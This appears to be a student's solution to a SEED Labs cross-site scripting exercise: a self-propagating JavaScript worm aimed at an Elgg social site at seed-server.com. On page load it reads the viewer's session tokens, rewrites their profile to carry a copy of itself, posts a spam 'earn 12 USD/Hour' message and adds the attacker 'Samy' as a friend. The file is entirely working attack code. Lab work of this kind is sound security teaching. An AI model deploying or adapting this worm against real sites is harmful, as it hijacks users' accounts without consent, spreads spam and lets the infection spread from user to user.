<script id="worm">
window.onload = function() {
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script>";
    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var samyguid = 59;
    var userguid = elgg.session.user.guid;
    var usrrname = elgg.session.user.name;
    var roll = 1905067;
    var sendurl1 = "http://www.seed-server.com/action/profile/edit";
    var sendurl2 = "http://www.seed-server.com/action/friends/add?friend=" + samyguid + ts + token;
    var sendurl3 = "http://www.seed-server.com/action/thewire/add";

    var content3 = "__elgg_token=" + token + "&__elgg_ts=" + ts +
        "&body=To earn 12 USD/Hour(!), visit now\n" + encodeURIComponent('http://www.seed-server.com/profile/'+usrrname);

    var content1 = "__elgg_token=" + token + "&__elgg_ts=" + ts +
        "&name=" + usrrname + "&description=" + wormCode + "&accesslevel[description]=1" +
        "&briefdescription=" + generateRandomString() + "&accesslevel[briefdescription]=1" +
        "&location=" + generateRandomString() + "&accesslevel[location]=1" +
        "&interests=" + generateRandomString() + "&accesslevel[interests]=1" +
        "&skills=" + generateRandomString() + "&accesslevel[skills]=1" +
        "&contactemail=" + generateRandomString() + "@gmail.com" + "&accesslevel[contactemail]=1" +
        "&phone=" + generateRandomString() + "&accesslevel[phone]=1" +
        "&mobile=" + generateRandomString() + "&accesslevel[mobile]=1" +
        "&website=" + generateRandomString() + ".com" + "&accesslevel[website]=1" +
        "&twitter=" + generateRandomString() + "&accesslevel[twitter]=1" +
        "&guid=" + userguid;
    // Contents can be done with formdata also like in task2 and task3 . 
    if (userguid != samyguid) {
        // Create and send Ajax request to modify profile
        var Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl1, true);
        Ajax.setRequestHeader("Host", "www.seed-server.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content1);

        var Ajax3 = new XMLHttpRequest();
        Ajax3.open("POST", sendurl3, true);
        Ajax3.setRequestHeader("Host", "www.seed-server.com");
        Ajax3.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax3.send(content3);

        var Ajax2 = new XMLHttpRequest();
        Ajax2.open("GET", sendurl2, true);
        Ajax2.setRequestHeader("Host", "www.seed-server.com");
        Ajax2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax2.send();

    }
}

function generateRandomString() {
    return Math.random().toString(36).substring(7);
}

</script>